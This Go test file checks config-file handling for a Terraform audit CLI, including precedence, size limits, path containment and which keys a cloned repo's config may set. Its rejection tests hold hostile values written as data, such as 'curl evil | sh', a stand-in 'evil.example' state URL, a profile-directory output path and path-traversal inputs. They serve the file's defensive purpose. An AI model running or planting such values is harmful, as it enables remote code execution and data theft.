package cli

import (
	"io"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/5xxeu/tforphans/internal/state"
)

// A config file in the current directory supplies flags; the command line
// replaces them, lists included; paths of another file are relative to it.
func TestConfig(t *testing.T) {
	dir := t.TempDir()
	t.Chdir(dir)
	conf := `
roots: [infra]
state-roots:
  - teams
  - ./org/../tree
scan: cloudflare
scan-scope: [state]
ignore-preset: [cloudflare-system]
exclude-types: [cloudflare_api_token, cloudflare_account_member]
strict: true
format: summary
limit: 5
names-from-tags: true
state-parallelism: 4
`
	if err := os.WriteFile(defaultConfigFile, []byte(conf), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, d := range []string{"infra", "teams", "org", "tree"} {
		os.Mkdir(d, 0o755)
	}
	o, err := parseFlags(nil, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(o.src.roots, []string{"infra"}) || !slices.Equal(o.src.stateRoots, []string{"teams", "tree"}) ||
		!slices.Equal(o.src.scans, []string{"cloudflare"}) || !o.src.scopeState || !o.audit.strict || o.format != "summary" || o.src.limit != 5 ||
		!o.src.exclude.Match("cloudflare_api_token") || !o.src.exclude.Match("cloudflare_account_member") || o.configFile != defaultConfigFile {
		t.Errorf("from the file: %+v", o)
	}
	o, err = parseFlags([]string{"-format", "json", "-exclude-types", "x_*", "-strict=false", "other"}, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	if o.format != "json" || o.audit.strict || !slices.Equal(o.src.roots, []string{"other"}) || o.src.exclude.Match("cloudflare_api_token") || !o.src.exclude.Match("x_y") {
		t.Errorf("command line over the file: %+v", o)
	}
	// adopt has no -format, and only adopt has -names-from-tags: the
	// shared file still works for both.
	if o.adopt.tagNames() || o.src.stateParallelism != 4 {
		t.Errorf("mode keys: %+v", o)
	}
	if o, err := parseFlags([]string{"adopt"}, io.Discard); err != nil || o.adopt == nil || !o.audit.strict || !o.adopt.namesFromTags {
		t.Errorf("adopt with the file: %+v, %v", o, err)
	}
	if o, err := parseFlags([]string{"-no-config"}, io.Discard); err != nil || o.audit.strict || len(o.src.scans) > 0 || o.configFile != "" {
		t.Errorf("-no-config: %+v, %v", o, err)
	}

	// Another file: its relative paths are relative to it.
	sub := filepath.Join(dir, "audits")
	os.Mkdir(sub, 0o755)
	os.WriteFile(filepath.Join(sub, "cf.yaml"), []byte("roots: [../infra]\nstate-roots: [teams, /abs/tree]\nignore: ignore.txt\n"), 0o644)
	o, err = parseFlags([]string{"-config", "audits/cf.yaml"}, io.Discard)
	if err != nil {
		t.Fatal(err)
	}
	// Joined as written (no cleaning), from the directory the file really
	// is in.
	real, _ := filepath.EvalSymlinks(sub)
	sep := string(filepath.Separator)
	// infra exists: its links are resolved (so is the temporary directory).
	realDir, _ := filepath.EvalSymlinks(dir)
	if !slices.Equal(o.src.roots, []string{filepath.Join(realDir, "infra")}) || !slices.Equal(o.src.stateRoots, []string{real + sep + "teams", "/abs/tree"}) ||
		o.ignore.path != real+sep+"ignore.txt" {
		t.Errorf("-config elsewhere: %+v", o)
	}
}

func TestConfigMaxStateSize(t *testing.T) {
	t.Chdir(t.TempDir())
	for _, c := range []struct {
		value string
		size  int64
	}{
		{"512M", 512 << 20},
		{"1024", 1024},
		{"1G", state.DefaultMaxSize},
		{"1073741825", state.DefaultMaxSize + 1},
		{"2G", 2 << 30},
	} {
		if err := os.WriteFile(defaultConfigFile, []byte("max-state-size: "+c.value+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		for _, argv := range [][]string{nil, {"-max-state-size", "2G"}} {
			o, err := parseFlags(argv, io.Discard)
			if c.size > state.DefaultMaxSize {
				if err == nil || !strings.Contains(err.Error(), "max-state-size") || !strings.Contains(err.Error(), "command line or via -config") {
					t.Errorf("automatic %s, %v: %v", c.value, argv, err)
				}
				continue
			}
			want := c.size
			if len(argv) > 0 {
				want = 2 << 30
			}
			if err != nil || o.src.maxStateSize != want {
				t.Errorf("automatic %s, %v: %+v, %v", c.value, argv, o, err)
			}
		}
		for _, argv := range [][]string{{"-config", defaultConfigFile}, {"-no-config", "-max-state-size", c.value}, {"-config", defaultConfigFile, "-max-state-size", c.value}} {
			if o, err := parseFlags(argv, io.Discard); err != nil || o.src.maxStateSize != c.size {
				t.Errorf("explicit %s, %v: %+v, %v", c.value, argv, o, err)
			}
		}
	}
	if err := os.WriteFile(defaultConfigFile, []byte("max-state-size: 0\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := parseFlags(nil, io.Discard); err == nil || !strings.Contains(err.Error(), "max-state-size") {
		t.Errorf("invalid config limit: %v", err)
	}
}

// No config file runs commands, sends credentials or writes files; one
// read on its own (it may come with a cloned repository) cannot raise trust
// either; unknown keys and bad values are errors.
func TestConfigRejected(t *testing.T) {
	for conf, want := range map[string]string{
		"plugin: [curl evil | sh]\n":            "only on the command line",
		"terraform: ./evil\n":                   "only on the command line",
		"o: ~/.profile.d/x\n":                   "only on the command line",
		"allow-http: true\n":                    "only on the command line",
		"terragrunt: true\n":                    "only on the command line",
		"init: true\n":                          "only from a file given with -config",
		"state: [https://evil.example/state]\n": "only from a file given with -config",
		"state: [fake.tfstate]\n":               "only from a file given with -config",
		"proxmox-cluster-states: true\n":        "only from a file given with -config",
		"plugin-cluster-states: true\n":         "only from a file given with -config",
		"allow-incomplete: true\n":              "only from a file given with -config",
		"stat-roots: [x]\n":                     `unknown key "stat-roots"`,
		"no-config: true\n":                     "unknown key",
		"strict: [true, false]\n":               "true or false",
		"scan: {cloudflare: true}\n":            "want a value",
		"limit: lots\n":                         "limit: parse error",
		"scan: [cloudflare\n":                   "yaml",
	} {
		dir := t.TempDir()
		t.Chdir(dir)
		os.WriteFile(defaultConfigFile, []byte(conf), 0o644)
		if _, err := parseFlags([]string{"adopt"}, io.Discard); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%q: %v, want %q", conf, err, want)
		}
	}
	// Keys of the report mode: refresh runs the root's data sources,
	// include-attrs puts attribute values into the output.
	for _, conf := range []string{"refresh: true\n", "include-attrs: [content]\n", "allow-unpinned: true\n"} {
		t.Chdir(t.TempDir())
		os.WriteFile(defaultConfigFile, []byte(conf), 0o644)
		if _, err := parseFlags(nil, io.Discard); err == nil || !strings.Contains(err.Error(), "only from a file given with -config") {
			t.Errorf("%q: %v", conf, err)
		}
	}
	// A file the user names may raise trust, not run commands or send
	// credentials (o in report mode too: it is no mode-only key to skip).
	dir := t.TempDir()
	t.Chdir(dir)
	os.WriteFile("audit.yaml", []byte("state: [prod.tfstate]\ninit: true\nproxmox-cluster-states: true\n"), 0o644)
	if o, err := parseFlags([]string{"-config", "audit.yaml"}, io.Discard); err != nil || !o.src.init || len(o.src.states) != 1 {
		t.Errorf("-config with trust keys: %+v, %v", o, err)
	}
	for _, conf := range []string{"plugin: [./list.sh]\n", "state: [https://gitlab.example/state]\n", "terraform: ./tf\n", "terragrunt: true\n", "o: x.tf\n"} {
		os.WriteFile("audit.yaml", []byte(conf), 0o644)
		if _, err := parseFlags([]string{"-config", "audit.yaml"}, io.Discard); err == nil || !strings.Contains(err.Error(), "only on the command line") {
			t.Errorf("-config %q: %v", conf, err)
		}
	}
}

// A terraform path runs in other directories (roots, temporary ones), so it
// becomes absolute; a plain name stays a PATH lookup.
func TestTerraformPath(t *testing.T) {
	dir := t.TempDir()
	t.Chdir(dir)
	cwd, _ := os.Getwd()
	for args, want := range map[string]string{
		"-terraform ./bin/terraform": cwd + string(filepath.Separator) + "./bin/terraform",
		"-terraform tofu":            "tofu",
	} {
		o, err := parseFlags(strings.Fields(args), io.Discard)
		if err != nil {
			t.Fatal(err)
		}
		if o.src.terraformBin != want {
			t.Errorf("%s: %s, want %s", args, o.src.terraformBin, want)
		}
	}
}

// Paths of a file read on its own stay within the current directory, as
// the system resolves them: a link before .. and "x://" count.
func TestConfigTooLarge(t *testing.T) {
	t.Chdir(t.TempDir())
	big := "# " + strings.Repeat("x", maxConfigSize) + "\n"
	if err := os.WriteFile(defaultConfigFile, []byte(big), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := parseFlags(nil, io.Discard); err == nil || !strings.Contains(err.Error(), "larger than") {
		t.Fatalf("oversized config: %v", err)
	}
}

func TestConfigInside(t *testing.T) {
	base := t.TempDir()
	repo, outside := filepath.Join(base, "repo"), filepath.Join(base, "outside")
	for _, d := range []string{filepath.Join(repo, "x:"), filepath.Join(repo, "in"), filepath.Join(outside, "sub"), filepath.Join(outside, "target"), filepath.Join(outside, "teams")} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Skip(err) // no colon in names (Windows)
		}
	}
	write := func(p, s string) { os.WriteFile(p, []byte(s), 0o644) }
	write(filepath.Join(outside, "ignore"), "")
	if err := os.Symlink(filepath.Join(outside, "sub"), filepath.Join(repo, "jump")); err != nil {
		t.Skip(err)
	}
	os.Symlink(outside, filepath.Join(repo, "out"))
	t.Chdir(repo)
	for conf, want := range map[string]string{
		"state-roots: [../outside/teams]\n":            "outside the current directory",
		"state-roots: [" + outside + "/teams]\n":       "outside the current directory",
		"roots: [jump/../target]\n":                    "outside the current directory",
		"state-roots: [\"x://../../outside/teams\"]\n": "outside the current directory",
		"ignore: out/ignore\n":                         "outside the current directory",
		"roots: [missing]\n":                           "no such file",
	} {
		write(defaultConfigFile, conf)
		if _, err := parseFlags(nil, io.Discard); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%q: %v, want %q", conf, err, want)
		}
	}
	// Inside is fine, and the resolved path is used.
	write(defaultConfigFile, "roots: [./in/../in]\nstate-roots: [x:/../in]\n")
	if o, err := parseFlags(nil, io.Discard); err != nil || !slices.Equal(o.src.roots, []string{"in"}) || !slices.Equal(o.src.stateRoots, []string{"in"}) {
		t.Errorf("inside: %+v, %v", o, err)
	}
	// A file given with -config may point anywhere, and its paths end
	// where the system takes them: a link before .. counts.
	os.Remove(defaultConfigFile)
	os.Mkdir("audits", 0o755)
	os.Symlink(filepath.Join(outside, "sub"), filepath.Join("audits", "jump"))
	write(filepath.Join("audits", "audit.yaml"), "roots: [jump/../target]\n")
	o, err := parseFlags([]string{"-config", "audits/audit.yaml"}, io.Discard)
	if err != nil || len(o.src.roots) != 1 {
		t.Fatalf("-config: %+v, %v", o, err)
	}
	// Resolved for good: later joins (temporary query files) must land
	// where terraform runs.
	want, _ := filepath.EvalSymlinks(filepath.Join(outside, "target"))
	if o.src.roots[0] != want {
		t.Errorf("-config root %s, want %s", o.src.roots[0], want)
	}
}

// terragrunt-unit only classifies directories: a file read on its own may
// set it (inside the current directory, like roots); terragrunt itself
// still needs -terragrunt on the command line.
func TestConfigTerragruntUnit(t *testing.T) {
	dir := t.TempDir()
	t.Chdir(dir)
	os.MkdirAll("live/app", 0o755)
	os.WriteFile(defaultConfigFile, []byte("terragrunt-unit: [live/app]\n"), 0o644)
	o, err := parseFlags([]string{"-terragrunt"}, io.Discard)
	if err != nil || len(o.src.tgUnits) != 1 || !strings.HasSuffix(o.src.tgUnits[0], filepath.Join("live", "app")) {
		t.Errorf("%+v %v", o, err)
	}
	os.WriteFile(defaultConfigFile, []byte("terragrunt-unit: [../x]\n"), 0o644)
	if _, err := parseFlags([]string{"-terragrunt"}, io.Discard); err == nil {
		t.Error("a path outside the current directory was accepted")
	}
}

func TestConfigMaxQuerySize(t *testing.T) {
	t.Chdir(t.TempDir())
	write := func(v string) {
		if err := os.WriteFile(defaultConfigFile, []byte("max-query-size: "+v+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("256M")
	if o, err := parseFlags(nil, io.Discard); err != nil || o.src.maxQuerySize != 256<<20 {
		t.Errorf("lower in an automatic file: %+v, %v", o, err)
	}
	write("2G")
	if _, err := parseFlags(nil, io.Discard); err == nil || !strings.Contains(err.Error(), "max-query-size") {
		t.Errorf("higher in an automatic file: %v", err)
	}
	if o, err := parseFlags([]string{"-config", defaultConfigFile}, io.Discard); err != nil || o.src.maxQuerySize != 2<<30 {
		t.Errorf("higher with -config: %+v, %v", o, err)
	}
}
